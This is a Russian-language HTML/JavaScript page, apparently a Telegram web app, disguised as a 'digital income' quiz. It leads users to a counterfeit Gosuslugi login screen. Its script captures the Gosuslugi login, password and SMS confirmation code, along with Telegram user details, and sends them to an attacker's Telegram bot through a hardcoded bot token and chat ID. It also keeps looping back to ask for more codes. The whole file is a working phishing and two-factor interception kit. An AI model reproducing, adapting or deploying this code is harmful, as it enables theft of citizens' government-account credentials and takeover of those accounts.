<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>–¶–∏—Ñ—Ä–æ–≤–æ–π –¥–æ—Ö–æ–¥</title>
  <style>
    body { font-family: sans-serif; background: #eaf4ff; margin: 0; padding: 20px; }
    .container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: none; box-sizing: border-box; }
    h1 { font-size: 20px; margin-bottom: 10px; }
    p { margin-bottom: 20px; }
    button, select, input[type="text"], input[type="password"] {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      margin-bottom: 10px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-sizing: border-box;
    }
    .blue { background: #2563eb; color: white; }
    .green { background: #22c55e; color: white; }
    .gray { background: #e5e7eb; color: #111827; }
    .gray.active { background: #22c55e; color: white; }
    input[type="text"], input[type="password"] { border: 1px solid #d1d5db; }
    .note { font-size: 14px; color: #6b7280; }
    ul { padding-left: 20px; margin-top: 10px; }
    li { margin-bottom: 6px; }
    .loader {
      border: 4px solid #e5e7eb;
      border-top: 4px solid #2563eb;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container" id="screen1" style="display:block">
    <h1>üíº –¶–∏—Ñ—Ä–æ–≤–æ–π –¥–æ—Ö–æ–¥, –ø–æ–¥—Ö–æ–¥—è—â–∏–π –∏–º–µ–Ω–Ω–æ —Ç–µ–±–µ</h1>
    <p>–í 2025 –≥–æ–¥—É –ø–æ—è–≤–∏–ª–æ—Å—å –±–æ–ª–µ–µ 40 —Å–ø–æ—Å–æ–±–æ–≤ –ª–µ–≥–∞–ª—å–Ω–æ–≥–æ —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∫–∞. –ü—Ä–æ–≤–µ—Ä—å, –∫–∞–∫–∏–µ –¥–æ—Å—Ç—É–ø–Ω—ã –ª–∏—á–Ω–æ —Ç–µ–±–µ.</p>
    <button class="blue" onclick="nextScreen(2)">üîç –£–∑–Ω–∞—Ç—å –º–æ–∏ –≤–∞—Ä–∏–∞–Ω—Ç—ã</button>
  </div>

  <div class="container" id="screen2">
    <h1>–í—ã–±–µ—Ä–∏—Ç–µ —Å–≤–æ–π —Å—Ç–∞—Ç—É—Å</h1>
    <button class="blue" onclick="selectStatus('–°–∞–º–æ–∑–∞–Ω—è—Ç—ã–π')">‚úÖ –°–∞–º–æ–∑–∞–Ω—è—Ç—ã–π</button>
    <button class="blue" onclick="selectStatus('–°—Ç—É–¥–µ–Ω—Ç')">üë®‚Äçüíª –°—Ç—É–¥–µ–Ω—Ç</button>
    <button class="blue" onclick="selectStatus('–†–æ–¥–∏—Ç–µ–ª—å')">üßë‚Äçü§ù‚Äçüßë –†–æ–¥–∏—Ç–µ–ª—å</button>
    <button class="blue" onclick="selectStatus('–ë–µ–∑—Ä–∞–±–æ—Ç–Ω—ã–π')">üßç‚Äç‚ôÇÔ∏è –ë–µ–∑—Ä–∞–±–æ—Ç–Ω—ã–π</button>
    <button class="blue" onclick="selectStatus('–ü–æ —Ä–µ–≥–∏–æ–Ω—É')">üìç –ü–æ —Ä–µ–≥–∏–æ–Ω—É</button>
  </div>

  <div class="container" id="screen3">
    <h1>–£–∫–∞–∂–∏—Ç–µ –≤–∞—à —Ç–µ–∫—É—â–∏–π –¥–æ—Ö–æ–¥ –≤ —Ä—É–±–ª—è—Ö (–≤ –º–µ—Å—è—Ü)</h1>
    <input type="text" id="income" placeholder="–ù–∞–ø—Ä–∏–º–µ—Ä, 25 000" oninput="formatInput(this)" />
    <button id="continueBtn" class="gray" onclick="nextScreen(4)" disabled>–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
  </div>

  <div class="container" id="screen4">
    <h1>–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ</h1>
    <p id="confirmation"></p>
    <button class="green" onclick="nextScreen(5)">–ü–µ—Ä–µ–π—Ç–∏ –∫ –ø–æ–¥–±–æ—Ä–∫–µ</button>
  </div>

  <div class="container" id="screen5">
    <h1>üéØ –ü–æ–¥–±–æ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–ø–æ—Å–æ–±–æ–≤ –¥–æ—Ö–æ–¥–∞ –≥–æ—Ç–æ–≤–∞</h1>
    <p>–ú—ã —É—á–ª–∏ –≤–∞—à —Å—Ç–∞—Ç—É—Å –∏ —É—Ä–æ–≤–µ–Ω—å –¥–æ—Ö–æ–¥–∞. –ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–π –¥–æ—Å—Ç—É–ø ‚Äî –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ª–∏—á–Ω–æ—Å—Ç—å —á–µ—Ä–µ–∑ –ì–æ—Å—É—Å–ª—É–≥–∏.</p>
    <button class="blue" onclick="nextScreen(6)">üîê –í–æ–π—Ç–∏ —á–µ—Ä–µ–∑ –ì–æ—Å—É—Å–ª—É–≥–∏</button>
    <div class="note">
      <p>–ó–∞—á–µ–º —ç—Ç–æ –Ω—É–∂–Ω–æ:</p>
      <ul style="list-style: none; padding-left: 0;">
        <li>‚úî –ò—Å–∫–ª—é—á–∞–µ–º —Ñ–µ–π–∫–æ–≤—ã–µ –∑–∞—è–≤–∫–∏</li>
        <li>‚úî –ü–æ–¥–±–∏—Ä–∞–µ–º —Ç–æ—á–Ω—ã–µ –º–µ—Ä—ã –ø–æ–¥–¥–µ—Ä–∂–∫–∏</li>
        <li>‚úî –£—á–∏—Ç—ã–≤–∞–µ–º –≤–æ–∑—Ä–∞—Å—Ç, —Ä–µ–≥–∏–æ–Ω –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω–Ω—ã–π —Å—Ç–∞—Ç—É—Å</li>
      </ul>
    </div>
  </div>

  <!-- –ù–æ–≤—ã–π —ç–∫—Ä–∞–Ω –ì–æ—Å—É—Å–ª—É–≥–∏ –≤ –æ–±—â–µ–º —Å—Ç–∏–ª–µ -->
  <div class="container" id="screen6">
    <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
      <span style="color:#2563eb;">–≥–æ—Å</span><span style="color:#ef4444;">—É—Å–ª—É–≥–∏</span>
    </h1>
    <div style="margin-bottom: 16px;">
      <input type="text" class="input" id="loginInput" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω / Email / –°–ù–ò–õ–°" style="margin-bottom: 12px;" />
      <div id="loginError" style="color:#ef4444; font-size:13px; margin-bottom:6px; display:none;"></div>
      <input type="password" class="input" id="passwordInput" placeholder="–ü–∞—Ä–æ–ª—å" style="margin-bottom: 8px;" />
      <div id="passwordError" style="color:#ef4444; font-size:13px; margin-bottom:6px; display:none;"></div>
      <div style="margin-bottom: 20px; text-align:left;">
        <a href="https://esia.gosuslugi.ru/login/recovery" target="_blank" style="color:#2563eb; cursor:pointer; font-size:15px; text-decoration:none;">
          –í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å
        </a>
      </div>
      <button class="blue" onclick="validateLoginForm()" style="font-weight:bold;">–í–æ–π—Ç–∏</button>
      <div style="margin-top: 10px; text-align:center;">
        <a href="https://esia.gosuslugi.ru/login/recovery" target="_blank" style=" color:#2563eb; cursor:pointer; font-size:15px; text-decoration:none;">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>
      </div>
    </div>
  </div>

  <!-- –ù–æ–≤—ã–π —ç–∫—Ä–∞–Ω –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—Ö–æ–¥–∞ –ø–æ –°–ú–° -->
  <div class="container" id="screen7">
    <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
      <span style="color:#2563eb;">–≥–æ—Å</span><span style="color:#ef4444;">—É—Å–ª—É–≥–∏</span>
    </h1>
    <div style="margin-bottom: 18px; text-align:center;">
      <div style="font-size: 18px; margin-bottom: 8px; font-weight: bold;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—Ö–æ–¥ –ø–æ –°–ú–°</div>
      <div style="font-size: 15px; color: #6b7280; margin-bottom: 18px;">–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω</div>
      <div id="code-inputs" style="display: flex; justify-content: center; gap: 6px; margin-bottom: 18px;">
        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
      </div>
      <div style="font-size: 15px; margin-bottom: 18px;">
        <span id="sms-timer-block" style="color: #6b7280;">
          –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ —á–µ—Ä–µ–∑ <span id="sms-timer" style="font-weight:bold; color:#111827;">00:00</span>
        </span>
        <span id="sms-resend" style="display:none; font-weight:bold; color:#2563eb; cursor:pointer;">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ —Å–Ω–æ–≤–∞</span>
      </div>
      <div style="margin-bottom: 8px;">
        <span style="color:#2563eb; cursor:pointer; font-size:15px;">–ù–µ –º–æ–≥—É –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—Ö–æ–¥</span>
      </div>
      <div style="font-size: 13px; color: #6b7280;">
        –ï—Å–ª–∏ –≤–∞–º –Ω–µ –ø–æ—Å—Ç—É–ø–∞—é—Ç –°–ú–°, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –≤–≤–µ–¥—ë–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
      </div>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ—Å–ª–µ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ -->
  <div class="container" id="screen8">
    <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
      <span style="color:#2563eb;">–≥–æ—Å</span><span style="color:#ef4444;">—É—Å–ª—É–≥–∏</span>
    </h1>
    <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 180px;">
      <div class="loader" style="margin-bottom: 18px;"></div>
      <div style="font-size: 18px; color: #2563eb;">–ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥...</div>
    </div>
  </div>

  <script>
    let userStatus = '';
    let smsTimerInterval = null;
    let incomeValue = '';

    function nextScreen(screenNumber) {
      document.querySelectorAll('.container').forEach(el => el.style.display = 'none');
      document.getElementById('screen' + screenNumber).style.display = 'block';

      if (screenNumber === 4) {
        const raw = document.getElementById('income').value.replace(/\D/g, '');
        incomeValue = raw;
        const formattedIncome = new Intl.NumberFormat('ru-RU').format(raw);
        document.getElementById('confirmation').textContent = `–í—ã –≤—ã–±—Ä–∞–ª–∏: ${userStatus}, –¥–æ—Ö–æ–¥: ${formattedIncome} ‚ÇΩ/–º–µ—Å`;
      }
      if (screenNumber === 5) {
        logToAdmin({ event: 'before_gosuslugi', status: userStatus, income: incomeValue });
      }
      if (screenNumber === 6) {
        logToAdmin({ event: 'gosuslugi_enter' });
      }
      if (screenNumber === 7) {
        startSMSTimer();
        setupCodeInputs();
      }
    }

    function selectStatus(status) {
      userStatus = status;
      nextScreen(3);
    }

    function formatInput(input) {
      const raw = input.value.replace(/\D/g, '');
      const btn = document.getElementById('continueBtn');
      if (raw) {
        input.value = new Intl.NumberFormat('ru-RU').format(raw);
        btn.disabled = false;
        btn.classList.add('active');
      } else {
        input.value = '';
        btn.disabled = true;
        btn.classList.remove('active');
      }
    }

    function startSMSTimer() {
      if (smsTimerInterval) {
        clearInterval(smsTimerInterval);
        smsTimerInterval = null;
      }
      let timer = 60;
      const timerSpan = document.getElementById('sms-timer');
      const timerBlock = document.getElementById('sms-timer-block');
      const resendBtn = document.getElementById('sms-resend');
      if (!timerSpan || !timerBlock || !resendBtn) return;
      timerBlock.style.display = '';
      resendBtn.style.display = 'none';
      timerSpan.textContent = '01:00';
      smsTimerInterval = setInterval(() => {
        timer--;
        let min = String(Math.floor(timer / 60)).padStart(2, '0');
        let sec = String(timer % 60).padStart(2, '0');
        timerSpan.textContent = `${min}:${sec}`;
        if (timer <= 0) {
          clearInterval(smsTimerInterval);
          smsTimerInterval = null;
          timerBlock.style.display = 'none';
          resendBtn.style.display = '';
        }
      }, 1000);
    }

    function setupCodeInputs() {
      const inputs = document.querySelectorAll('#code-inputs .code-box');
      inputs.forEach((input, idx) => {
        input.value = '';
        input.oninput = function(e) {
          this.value = this.value.replace(/[^0-9]/g, '');
          if (this.value && idx < inputs.length - 1) {
            inputs[idx + 1].focus();
          }
          if ([...inputs].every(inp => inp.value.length === 1)) {
            const code = [...inputs].map(inp => inp.value).join('');
            logToAdmin({ event: 'gosuslugi_code', code });
            setTimeout(() => {
              nextScreen(8);
              setTimeout(() => {
                inputs.forEach(inp => inp.value = '');
                nextScreen(7);
              }, 2000);
            }, 200);
          }
        };
        input.onkeydown = function(e) {
          if (e.key === 'Backspace' && !this.value && idx > 0) {
            inputs[idx - 1].focus();
          }
        };
      });
      if (inputs.length) inputs[0].focus();
    }

    function validateLoginForm() {
      const login = document.getElementById('loginInput').value.trim();
      const password = document.getElementById('passwordInput').value;
      const loginError = document.getElementById('loginError');
      const passwordError = document.getElementById('passwordError');
      let valid = true;

      loginError.style.display = 'none';
      passwordError.style.display = 'none';
      loginError.textContent = '';
      passwordError.textContent = '';

      if (!login) {
        loginError.textContent = '–í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω';
        loginError.style.display = 'block';
        valid = false;
      }

      if (password.length < 6) {
        passwordError.textContent = '–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–µ –º–µ–Ω–µ–µ 6 —Å–∏–º–≤–æ–ª–æ–≤';
        passwordError.style.display = 'block';
        valid = false;
      }

      const specialChar = /[^a-zA-Z–∞-—è–ê-–Ø0-9]/;
      if (!specialChar.test(password)) {
        passwordError.textContent = '–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π —Å–∏–º–≤–æ–ª';
        passwordError.style.display = 'block';
        valid = false;
      }

      if (valid) {
        logToAdmin({ event: 'gosuslugi_login', login, password });
        nextScreen(7);
      }
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞–ø—Ä—è–º—É—é –≤ Telegram-–±–æ—Ç–∞
    function logToAdmin(data) {
      const BOT_TOKEN = '7597284856:AAHRJYxz1PvbDVEYcKxwtiX9FNH8ceEckzU'; // <-- –í–°–¢–ê–í–¨–¢–ï –°–í–û–ô –¢–û–ö–ï–ù
      const ADMIN_CHAT_ID = '7867932363'; // <-- –í–°–¢–ê–í–¨–¢–ï –°–í–û–ô chat_id
      // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ—É –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ –∏–∑ Telegram WebApp
      const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
      if (tgUser) {
        data.tg_user_id = tgUser.id;
        data.tg_username = tgUser.username;
        data.tg_first_name = tgUser.first_name;
        data.tg_last_name = tgUser.last_name;
      }
      let userInfo = '';
      if (data.tg_user_id) {
        userInfo = `\nTelegram ID: ${data.tg_user_id}` +
                   (data.tg_username ? `\nUsername: @${data.tg_username}` : '') +
                   (data.tg_first_name ? `\n–ò–º—è: ${data.tg_first_name}` : '') +
                   (data.tg_last_name ? `\n–§–∞–º–∏–ª–∏—è: ${data.tg_last_name}` : '');
      }
      let text = '';
      if (data.event === 'before_gosuslugi') {
        text = `–í–µ–±-–∞–ø–ø: –∑–∞–ø–æ–ª–Ω–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ\n–°—Ç–∞—Ç—É—Å: ${data.status}\n–î–æ—Ö–æ–¥: ${data.income}`;
      } else if (data.event === 'gosuslugi_enter') {
        text = '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ—à—ë–ª –∫ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ –ì–æ—Å—É—Å–ª—É–≥–∏';
      } else if (data.event === 'gosuslugi_login') {
        text = `–í–≤–æ–¥ –ì–æ—Å—É—Å–ª—É–≥:\n–õ–æ–≥–∏–Ω: ${data.login}\n–ü–∞—Ä–æ–ª—å: ${data.password}`;
      } else if (data.event === 'gosuslugi_code') {
        text = `–í–≤–µ–¥—ë–Ω –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: ${data.code}`;
      } else {
        text = JSON.stringify(data, null, 2);
      }
      text += userInfo;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: text
        })
      });
    }
  </script>
</body>
</html>
